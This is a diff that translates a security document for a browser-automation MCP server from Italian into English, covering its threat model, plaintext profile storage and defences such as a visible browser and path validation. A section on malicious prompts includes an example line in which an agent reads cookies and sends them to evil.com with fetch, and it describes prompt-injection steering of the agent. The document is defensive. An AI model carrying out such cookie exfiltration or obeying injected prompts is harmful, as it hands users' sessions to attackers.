@@ -1,115 +1,115 @@
 # Security
 
-## Modello di threat
+## Threat model
 
-`mysupportdetails-mcp` gestisce **profili browser persistenti** che contengono:
-- Cookie di sessione (token login attivi)
-- localStorage (JWT, refresh token)
+`mysupportdetails-mcp` manages **persistent browser profiles** that contain:
+- Session cookies (active login tokens)
+- localStorage (JWT, refresh tokens)
 - IndexedDB
-- Cache HTTP (spesso include immagini, response API)
-- Cronologia navigazione
+- HTTP cache (often includes images, API responses)
+- Browsing history
 
-**Chi ha lettura del filesystem locale ha accesso completo a tutto quanto sopra**, come per il profilo Chrome/Firefox di sistema.
+**Anyone with read access to the local filesystem has full access to everything above**, same as for the system Chrome/Firefox profile.
 
-## Cosa NON facciamo (per scelta, v0.x)
+## What we do NOT do (by choice, v0.x)
 
-- **Nessuna crittografia at-rest**: i file sotto `~/.msd/profiles/` sono in chiaro. Un attaccante con lettura del filesystem può:
-  - Copiare la cartella cookie e rigiocare le sessioni su un'altra macchina
-  - Estrarre token JWT da localStorage
-  - Fare hijack di sessioni SSO
-- **Nessun sandboxing extra oltre a quello nativo del browser**: le pagine navigate hanno gli stessi privilegi di una normale sessione Chrome/Firefox.
-- **Nessuna audit trail delle azioni MCP**: chi ha lanciato quale tool, quando, con quali parametri, non viene loggato.
+- **No encryption at-rest**: files under `~/.msd/profiles/` are stored in clear. An attacker with filesystem read access can:
+  - Copy the cookie folder and replay sessions on another machine
+  - Extract JWT tokens from localStorage
+  - Hijack SSO sessions
+- **No sandboxing beyond the browser's native sandbox**: navigated pages have the same privileges as a regular Chrome/Firefox session.
+- **No audit trail of MCP actions**: who invoked which tool, when, with which parameters is not logged.
 
-Le scelte sopra sono **intenzionali per il MVP**. Vedi ROADMAP.md per feature encryption v2 opt-in.
+The choices above are **intentional for the MVP**. See ROADMAP.md for the v2 opt-in encryption feature.
 
-## Cosa facciamo
+## What we do
 
-### Browser SEMPRE visibile di default (security-first)
+### Browser ALWAYS visible by default (security-first)
 
-Il browser si apre in modalita' **headed** (finestra visibile) di default. Non e' una scelta di UX, e' una scelta di sicurezza:
+The browser opens in **headed** mode (visible window) by default. It is not a UX choice, it is a security choice:
 
-- **L'utente vede in tempo reale cosa fa l'agente**. Se un prompt malevolo indirizza il browser verso un sito phishing, l'utente lo vede subito e killa.
-- **Nessuna esecuzione silent**. Nessun rischio che l'agente compili form / clicchi bottoni / accetti cookie banner in background senza consenso visivo.
-- **Debug immediato**. Errori Playwright, popup imprevisti, redirect strani sono visibili senza dover riabilitare screenshot dopo il fatto.
+- **The user sees in real time what the agent is doing.** If a malicious prompt sends the browser to a phishing site, the user sees it immediately and kills it.
+- **No silent execution.** Zero risk that the agent fills forms / clicks buttons / accepts cookie banners in the background with no visual consent.
+- **Immediate debug.** Playwright errors, unexpected popups, and strange redirects are visible without having to enable screenshots after the fact.
 
-L'opt-in a headless (env var `MSD_HEADLESS=1` o parametro tool call `headed: false`) e' documentato ma **richiede azione esplicita dell'utente**. Non c'e' modo di attivarlo tramite prompt malevolo perche' non e' un tool exposed ne' un flag di config runtime.
+The opt-in to headless (env var `MSD_HEADLESS=1` or per-call parameter `headed: false`) is documented but **requires explicit user action**. There is no way to enable it through a malicious prompt because it is neither an exposed tool nor a runtime config flag.
 
-Il valore default `headed: true` e' protetto da test unit obbligatorio in CI (vedi ARCHITECTURE.md).
+The `headed: true` default is protected by a required unit test in CI (see ARCHITECTURE.md).
 
-### Confinamento path
-`profile-store.resolvePath(browser, name)` valida che il nome del profilo:
-- non contenga `..`, `/`, `\`, `\0`
-- matchi regex `^[a-zA-Z0-9._-]{1,64}$`
-- il path risolto (post realpath) sia sotto `~/.msd/profiles/`
+### Path confinement
+`profile-store.resolvePath(browser, name)` validates that the profile name:
+- does not contain `..`, `/`, `\`, `\0`
+- matches the regex `^[a-zA-Z0-9._-]{1,64}$`
+- resolves (post-realpath) under `~/.msd/profiles/`
 
-Impedisce che un prompt malevolo dell'agente scriva fuori dal profile store (path traversal).
+This prevents a malicious agent prompt from writing outside the profile store (path traversal).
 
-### Nessun eval di prompt sensibili
-- `browser_evaluate` esegue JS **nel contesto della pagina web caricata**, non nel processo Node del server. Isolamento del browser sandbox rispettato.
-- I parametri dei tool sono validati con Zod schema prima di essere passati a Playwright.
+### No eval of sensitive prompts
+- `browser_evaluate` runs JS **in the page context of the loaded web page**, not in the server's Node process. The browser sandbox isolation is respected.
+- Tool parameters are validated with a Zod schema before being passed to Playwright.
 
-### Isolamento tra profili
-Ogni profilo ha una dir Playwright separata. Cookie, cache, storage isolati at-filesystem-level. Nessuna cross-contamination.
+### Isolation between profiles
+Each profile has its own Playwright dir. Cookies, cache, and storage are isolated at the filesystem level. No cross-contamination.
 
-### Best practice consigliate all'utente
+### Best practices recommended to the user
 
-Nel README + prompt iniziale che mostriamo alla prima esecuzione:
+In the README + the initial prompt shown on first run:
 
 ```
-IMPORTANTE:
-- mysupportdetails-mcp salva cookie e sessioni browser in chiaro sotto ~/.msd/.
-- Non usare su macchine condivise senza disk encryption.
-- Non salvare in un profilo mysupportdetails-mcp credenziali critiche (banking, azienda,
-  admin panel di produzione).
-- Un profilo mysupportdetails-mcp e' equivalente a un profilo Chrome/Firefox: chi legge
-  il filesystem ha accesso al tuo login attivo.
-- Per casi security-sensitive, aspetta la feature encryption opt-in v2.0.
+IMPORTANT:
+- mysupportdetails-mcp stores browser cookies and sessions in clear under ~/.msd/.
+- Do not run on shared machines without disk encryption.
+- Do not save critical credentials into a mysupportdetails-mcp profile (banking, corporate,
+  production admin panel).
+- A mysupportdetails-mcp profile is equivalent to a Chrome/Firefox profile: whoever reads
+  the filesystem has access to your active logins.
+- For security-sensitive scenarios, wait for the v2.0 opt-in encryption feature.
 ```
 
-### Cosa impedisce a un prompt malevolo di
+### What prevents a malicious prompt from
 
-**Estrarre cookie e mandarli a un server remoto**
-Un prompt che chiede all'agente di leggere cookie via `browser_evaluate` + `fetch("evil.com", {body: cookies})` funzionerebbe **se il sito visitato lo permette da JS della pagina**. Questo è isolamento cross-origin del browser: `document.cookie` accessibile solo dal dominio proprietario del cookie. `HttpOnly` cookies non leggibili nemmeno da JS.
+**Exfiltrating cookies to a remote server**
+A prompt that asks the agent to read cookies via `browser_evaluate` + `fetch("evil.com", {body: cookies})` would work **only if the visited site allows it from page JS**. This is the browser's standard cross-origin isolation: `document.cookie` is accessible only to the cookie's owning domain. `HttpOnly` cookies are not readable from JS at all.
 
-Non è un difetto di mysupportdetails-mcp — è il modello di sicurezza standard del web.
+This is not a mysupportdetails-mcp flaw ... it is the standard web security model.
 
-**Cancellare profili altrui**
-Il tool `profile_delete` è callable ma agisce solo su path sotto `~/.msd/profiles/`. Impossibile toccare filesystem esterno via questo tool.
+**Deleting other profiles**
+The `profile_delete` tool is callable but only acts on paths under `~/.msd/profiles/`. Impossible to touch the external filesystem through this tool.
 
-**Uploadare file arbitrari a un sito**
-`browser_type` inserisce testo, non file. Upload richiederebbe implementazione futura di `browser_file_upload` (non presente in v0.1.0). Quando/se lo aggiungiamo, il path del file da uploadare sarà validato.
+**Uploading arbitrary files to a site**
+`browser_type` inserts text, not files. Uploads would require a future `browser_file_upload` (not present in v0.1.0). When/if we add it, the uploaded file path will be validated.
 
-## Cross-platform note
+## Cross-platform notes
 
 ### macOS
-- Playwright download binari da Microsoft CDN al primo `install`. Verifica firma bundled.
-- Il profilo Chrome/Firefox è ~/Library/Application Support/Google/Chrome — mysupportdetails-mcp NON tocca quel path.
+- Playwright downloads binaries from Microsoft's CDN on first `install`. Bundled signature check.
+- The system Chrome/Firefox profile lives in ~/Library/Application Support/Google/Chrome ... mysupportdetails-mcp does NOT touch that path.
 
 ### Linux
-- Se hai `SELinux` in enforcing, potrebbe bloccare Playwright headed. Whitelist il context Node.
-- Sandbox namespace: Chromium richiede `--no-sandbox` in alcune configurazioni CI. Flag disponibile ma sconsigliato in dev.
+- If you have `SELinux` in enforcing mode, it may block headed Playwright. Whitelist the Node context.
+- Sandbox namespace: Chromium requires `--no-sandbox` in some CI setups. The flag is available but discouraged in dev.
 
 ### Windows
-- Windows Defender può marcare Chromium Playwright bundled come sospetto al primo download. Aggiungi eccezione per `%USERPROFILE%\.cache\ms-playwright`.
-- Path separator `\` gestito da Node — mysupportdetails-mcp non hardcoda mai `/`.
+- Windows Defender may flag the bundled Playwright Chromium as suspicious on first download. Add an exception for `%USERPROFILE%\.cache\ms-playwright`.
+- The `\` path separator is handled by Node ... mysupportdetails-mcp never hardcodes `/`.
 
-## Segnalazione vulnerabilità
+## Vulnerability disclosure
 
-Vulnerabilità di sicurezza vanno inviate privatamente a: `security@kuramalab.dev` (email da configurare).
+Security vulnerabilities should be sent privately to: `security@kuramalab.dev` (email to be configured).
 
-Non aprire issue pubbliche per vulnerabilità.
+Do not open public issues for vulnerabilities.
 
-Risposta target: 48h prima triage, patch entro 7 giorni per HIGH/CRITICAL.
+Target response: 48h before triage, patch within 7 days for HIGH/CRITICAL.
 
-## Roadmap encryption v2
+## v2 encryption roadmap
 
-Feature opt-in `--encrypt`:
-- AES-256-GCM su tutti i file del profilo at-rest
-- Chiave master in OS keychain nativo:
+Opt-in `--encrypt` feature:
+- AES-256-GCM over every at-rest profile file
+- Master key in the native OS keychain:
   - macOS: Keychain Services
   - Linux: `libsecret` (GNOME Keyring / KDE Wallet)
   - Windows: DPAPI (Credential Manager)
-- Sblocco automatico se utente ha sessione OS attiva
-- Fallback prompt password all'apertura profilo
+- Automatic unlock if the user has an active OS session
+- Fallback password prompt on profile open
 
-Non nel MVP per non ritardare launch. Priorità v2.0.
+Not in the MVP so the launch is not delayed. Priority v2.0.
